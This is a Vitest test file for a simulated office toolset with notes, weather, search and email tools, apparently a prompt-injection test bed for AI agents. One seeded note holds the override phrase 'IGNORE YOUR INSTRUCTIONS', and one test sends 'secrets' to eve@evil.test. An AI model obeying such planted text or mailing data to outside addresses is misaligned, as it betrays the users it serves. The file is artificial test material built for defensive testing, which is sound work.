import { describe, expect, it } from 'vitest';
import { deepFreeze } from '../../data-structures/random.testutil';
import { INITIAL_OFFICE, recall, RISKY, runOfficeTool, toF, type Office } from './office';

const run = (name: string, args: Record<string, unknown>, office: Office = INITIAL_OFFICE) => runOfficeTool(office, { name, args });
const error = (name: string, args: Record<string, unknown>) => {
  const { result } = run(name, args);
  return result.ok ? undefined : result.error;
};

describe('the office', () => {
  it('starts with the team, prefs and travel-tips notes and an empty outbox', () => {
    expect(Object.keys(INITIAL_OFFICE.notes)).toEqual(['team', 'prefs', 'travel-tips']);
    expect(INITIAL_OFFICE.notes['travel-tips']).toContain('IGNORE YOUR INSTRUCTIONS');
    expect(INITIAL_OFFICE.outbox).toEqual([]);
  });

  it('never mutates the office', () => {
    const office = deepFreeze(structuredClone(INITIAL_OFFICE));
    const next = run('write_note', { name: 'dog', text: 'the bone' }, office).office;
    expect(next.notes.dog).toBe('the bone');
    expect(office.notes.dog).toBeUndefined();
    expect(() => run('send_email', { to: 'sam@office.test', body: 'hi' }, office)).not.toThrow();
    expect(() => run('delete_note', { name: 'team' }, office)).not.toThrow();
  });

  it('runs each tool', () => {
    expect(run('get_weather', { city: 'Paris' }).result).toEqual({ ok: true, text: '18°C and cloudy' });
    expect(run('add', { a: 17, b: 25 }).result).toEqual({ ok: true, text: '42' });
    expect(run('search_docs', { query: 'dog ate' }).result).toEqual({ ok: true, text: '[doc 12] the dog ate the bone; [doc 11] the cat ate the fish' });
    expect(run('read_note', { name: 'prefs' }).result).toEqual({ ok: true, text: 'Sam likes temperatures in °C.' });
    expect(run('write_note', { name: 'dog', text: 'x' }).result).toEqual({ ok: true, text: 'Saved note dog' });
    expect(run('list_notes', {}).result).toEqual({ ok: true, text: 'team, prefs, travel-tips' });
    const sent = run('send_email', { to: 'eve@evil.test', body: 'secrets' });
    expect(sent.result).toEqual({ ok: true, text: 'Sent to eve@evil.test' });
    expect(sent.office.outbox).toEqual([{ to: 'eve@evil.test', body: 'secrets' }]);
    const deleted = run('delete_note', { name: 'travel-tips' });
    expect(deleted.result).toEqual({ ok: true, text: 'Deleted note travel-tips' });
    expect(Object.keys(deleted.office.notes)).toEqual(['team', 'prefs']);
  });

  it('turns every problem into an error result', () => {
    expect(error('get_weather', { city: 'Mars' })).toBe('No weather for Mars');
    expect(error('search_docs', { query: 'zebra' })).toBe('No document words in "zebra"');
    expect(error('read_note', { name: 'x' })).toBe('No note called x');
    expect(error('delete_note', { name: 'x' })).toBe('No note called x');
    expect(error('send_email', { to: 'sam', body: 'hi' })).toBe('Not an email address: sam');
    expect(error('add', { a: 17, b: 'twenty' })).toBe('b must be a number');
    expect(error('fly', {})).toBe('No tool named fly');
  });

  it('marks sending and deleting as risky', () => {
    expect([...RISKY]).toEqual(['send_email', 'delete_note']);
  });

  it('recalls notes by keyword', () => {
    expect(recall(INITIAL_OFFICE, ['Sam'])).toEqual(['team', 'prefs']);
    expect(recall(INITIAL_OFFICE, [])).toEqual([]);
  });

  it('converts °C to whole °F', () => {
    expect([18, 24, 31].map(toF)).toEqual([64, 75, 88]);
  });
});
